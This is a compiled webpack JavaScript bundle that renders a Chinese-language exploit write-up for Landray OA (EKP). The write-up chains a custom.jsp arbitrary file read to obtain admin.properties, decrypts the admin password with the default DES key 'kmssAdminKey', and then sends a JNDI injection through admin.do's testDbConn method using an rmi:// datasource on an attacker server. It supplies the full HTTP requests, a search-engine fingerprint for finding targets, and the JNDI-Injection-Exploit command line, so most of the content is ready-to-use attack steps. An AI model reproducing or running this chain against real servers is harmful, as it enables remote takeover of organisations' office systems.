{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[76],{1e3:function(a,s,t){a.exports=t.p+\"assets/img/lanling-6.bb4f7df1.png\"},1001:function(a,s,t){a.exports=t.p+\"assets/img/lanling-7.c9a8bb8b.png\"},1897:function(a,s,t){\"use strict\";t.r(s);var n=t(56),e=Object(n.a)({},(function(){var a=this,s=a.$createElement,n=a._self._c||s;return n(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":a.$parent.slotKey}},[n(\"h1\",{attrs:{id:\"蓝凌oa-admin-do-jndi远程命令执行\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#蓝凌oa-admin-do-jndi远程命令执行\"}},[a._v(\"#\")]),a._v(\" 蓝凌OA admin.do JNDI远程命令执行\")]),a._v(\" \"),n(\"h2\",{attrs:{id:\"漏洞描述\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[a._v(\"#\")]),a._v(\" 漏洞描述\")]),a._v(\" \"),n(\"p\",[a._v(\"深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息，读取配置文件得到密钥后访问 admin.do 即可利用 JNDI远程命令执行获取权限\")]),a._v(\" \"),n(\"h2\",{attrs:{id:\"漏洞影响\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞影响\"}},[a._v(\"#\")]),a._v(\" 漏洞影响\")]),a._v(\" \"),n(\"a-checkbox\",{attrs:{checked:\"\"}},[a._v(\"蓝凌OA\")]),n(\"br\"),a._v(\" \"),n(\"h2\",{attrs:{id:\"网络测绘\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#网络测绘\"}},[a._v(\"#\")]),a._v(\" 网络测绘\")]),a._v(\" \"),n(\"a-checkbox\",{attrs:{checked:\"\"}},[a._v('app=\"Landray-OA系统\"')]),n(\"br\"),a._v(\" \"),n(\"h2\",{attrs:{id:\"漏洞复现\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[a._v(\"#\")]),a._v(\" 漏洞复现\")]),a._v(\" \"),n(\"p\",[a._v(\"利用 \"),n(\"strong\",[a._v(\"蓝凌OA custom.jsp 任意文件读取漏洞\")]),a._v(\" 读取配置文件\")]),a._v(\" \"),n(\"div\",{staticClass:\"language-plain extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-plain\"}},[n(\"code\",[a._v(\"/WEB-INF/KmssConfig/admin.properties\\n\")])])]),n(\"p\",[a._v(\"发送请求包\")]),a._v(\" \"),n(\"div\",{staticClass:\"language-plain extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-plain\"}},[n(\"code\",[a._v('POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1\\nHost: \\nUser-Agent: Go-http-client/1.1\\nContent-Length: 60\\nContent-Type: application/x-www-form-urlencoded\\nAccept-Encoding: gzip\\n\\nvar={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}\\n')])])]),n(\"p\",[n(\"img\",{attrs:{src:t(998),alt:\"img\"}})]),a._v(\" \"),n(\"p\",[a._v(\"获取password后，使用 DES方法 解密，默认密钥为 \"),n(\"strong\",[a._v(\"kmssAdminKey\")])]),a._v(\" \"),n(\"p\",[n(\"img\",{attrs:{src:t(999),alt:\"img\"}})]),a._v(\" \"),n(\"p\",[a._v(\"访问后台地址使用解密的密码登录\")]),a._v(\" \"),n(\"div\",{staticClass:\"language-plain extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-plain\"}},[n(\"code\",[a._v(\"http://xxx.xxx.xxx.xxx/admin.do\\n\")])])]),n(\"p\",[n(\"img\",{attrs:{src:t(1e3),alt:\"img\"}})]),a._v(\" \"),n(\"a-alert\",{attrs:{type:\"success\",message:\"使用工具执行命令: https://github.com/welk1n/JNDI-Injection-Exploit\",description:\"\",showIcon:\"\"}}),a._v(\" \"),n(\"br\"),a._v(\" \"),n(\"div\",{staticClass:\"language-plain extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-plain\"}},[n(\"code\",[a._v(\"java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]\\n\")])])]),n(\"p\",[a._v(\"运行工具监听端口 ping dnslog测试 命令执行 (蓝凌OA 默认使用的是 JDK 1.7)\")]),a._v(\" \"),n(\"div\",{staticClass:\"language-shell extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[n(\"code\",[a._v(\"POST /admin.do HTTP/1.1\\nHost: \\nCookie: \"),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"JSESSIONID\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),a._v(\"90EA764774514A566C480E9726BB3D3F\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),a._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"Hm_lvt_9838edd365000f753ebfdc508bf832d3\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"1620456866\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),a._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"Hm_lpvt_9838edd365000f753ebfdc508bf832d3\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"1620459967\")]),a._v(\"\\nContent-Length: \"),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"70\")]),a._v(\"\\nCache-Control: max-age\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"0\")]),a._v(\"\\nSec-Ch-Ua: \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\" Not A;Brand\"')]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"v\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"99\"')]),a._v(\", \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"Chromium\"')]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"v\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"90\"')]),a._v(\", \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"Google Chrome\"')]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"v\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"90\"')]),a._v(\"\\nSec-Ch-Ua-Mobile: ?0\\nUpgrade-Insecure-Requests: \"),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"1\")]),a._v(\"\\nUser-Agent: Mozilla/5.0 \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),a._v(\"Windows NT \"),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"10.0\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),a._v(\" Win64\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),a._v(\" x64\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\")\")]),a._v(\" AppleWebKit/537.36 \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),a._v(\"KHTML, like Gecko\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\")\")]),a._v(\" Chrome/90.0.4430.93 Safari/537.36\\nOrigin: \\nContent-Type: application/x-www-form-urlencoded\\nAccept: text/html,application/xhtml+xml,application/xml\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"q\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"0.9\")]),a._v(\",image/avif,image/webp,image/apng,*/*\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"q\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"0.8\")]),a._v(\",application/signed-exchange\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"v\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),a._v(\"b3\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"q\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"0.9\")]),a._v(\"\\n\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"method\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),a._v(\"testDbConn\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"&\")]),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"datasource\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),a._v(\"rmi://xxx.xxx.xxx.xxx:1099/cbdsdg\\n\")])])]),n(\"p\",[n(\"img\",{attrs:{src:t(1001),alt:\"img\"}})])],1)}),[],!1,null,null,null);s.default=e.exports},998:function(a,s,t){a.exports=t.p+\"assets/img/lanling-4.3acfa819.png\"},999:function(a,s,t){a.exports=t.p+\"assets/img/lanling-5.32e03505.png\"}}]);","extractedComments":[]}